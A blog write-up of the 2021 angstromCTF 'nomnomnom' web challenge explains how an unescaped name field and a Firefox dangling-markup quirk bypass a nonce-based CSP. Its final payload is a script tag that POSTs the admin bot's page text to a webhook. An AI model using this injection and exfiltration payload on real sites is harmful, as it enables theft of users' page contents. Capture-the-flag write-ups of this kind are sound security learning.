---
title: "2021 ångstromCTF - nomnomnom Challenge"
layout: post
date: 2021-08-04 11:25
image: /assets/images/favicon/apple-touch-icon-76x76.png
headerImage: false
tag:
- CTF
- Web
- Dangling Markup
category: blog
author: Casparov
description: Writeup for the nomnomnom Web challenge in the 2021 ångstromCTF.
---


## <u> The Challenge </u>
I had the pleasure of participating in the 2021 ångstromCTF, and within it, the challenge I ended up enjoying the most was:

<img class="image" src="/assets/images/nomnomnomLanding.PNG">

## <u> Analysis </u>

To begin, as per usual for any web challenge I immediately looked at the source code, html code and the game itself. A few moments later it's safe to say that this challenge is an XSS challenge, due to this section inside the source code:

```javascript
return res.send(`
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-${nonce}'">
		<title>snek nomnomnom</title>
	</head>
	<body>
		${extra}${extra ? '<br /><br />' : ''}
		<h2>snek goes <em>nomnomnom</em></h2><br />
		Check out this score of ${score}! <br />
		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
		<br />
		This score was set by ${name}
		<script nonce='${nonce}'>
function report() {
	fetch('/report/${req.params.shareName}', {
		method: 'POST'
	});
}

document.getElementById('reporter').onclick = () => { report() };
		</script> 
		
	</body>
</html>`);
});
```

The game allows you to manually enter your own name within the browser window here, which provides an xss vector via the name variable. Any HTML tags inserted as name will be treated as actual HTML code!

## <u> Solution </u>

It took quite a while to find the solution for this challenge, and I started to go down an iframe rabbit hole. The main problem was the fact there was a `CSP (Content Security Policy)` that was blocking every script tag I provided because it required the usage of a randomly generated `nonce` as an attribute.

```html
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-a03da7bf8449792432c9623fa0644875'">
		<title>snek nomnomnom</title>
	</head>
	<body>
		
		<h2>snek goes <em>nomnomnom</em></h2><br />
		Check out this score of 1! <br />
		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
		<br />
		This score was set by <script>alert(1)</script>
		<script nonce='a03da7bf8449792432c9623fa0644875'>
function report() {
	fetch('/report/62231e1a14a18abb', {
		method: 'POST'
	})
}

document.getElementById('reporter').onclick = () => { report() }
		</script> 
		
	</body>
</html>
```
<img class = "image" src="/assets/images/nomnomnomnonce2.PNG">

That was until I found out that unfinished script tags ate (haha! nom'd) the script tag that was below it. The good thing about this is that it meant I could inject javascript code into the `<script src>` attribute with the nonce as the attribute of it, due to firefox being very weird with a topic called Dangling Markup.

The solution therefore is called a Dangling Markup Injection.
The report button sent a Simulated browser in admin context via Puppeteer within firefox, so the xss could be used to steal the "admin's" browser window, which was the only thing that displayed the flag, as seen three images above inside the `extra` variable.

In order to steal the admin's browser window though, we need to send their `document.body.innerText` to a webhook. Luckily, https://webhook.site is an easy solution to this and so the final solution to this problem is:

```html
<script src="data:text/javascript, fetch('webhookurlgoeshere', {method: 'POST', mode: 'no-cors', body: document.body.innerText})"
```

The `no-cors` mode basically allows us to bypass any problems with `CORS (Cross-Origin-Resource-Sharing)` which in turn stops any `Access-Control-Allow-Origin` errors.

But wait... that has nom'd everything including the report button functionality! Easy fix: just copy and paste the report function into the firefox console and run the function!

```javascript
function report() {
    fetch('/report/f8f9270fe102e65a', {
        method: 'POST'
    })
}
```

&nbsp;<img class = "image" src="/assets/images/report.PNG">&nbsp;

Once you have done that, your webhook.site should have recieved a request with the flag in it!

<img class = "image" src="/assets/images/sol.PNG">

Special thanks to Clanger and Feldma from my team for helping me with this challenge for a long time. This challenge ended up taking me a good 2 days due to my lack of knowledge about Dangling Markup. But it was still incredibly fun none-the-less!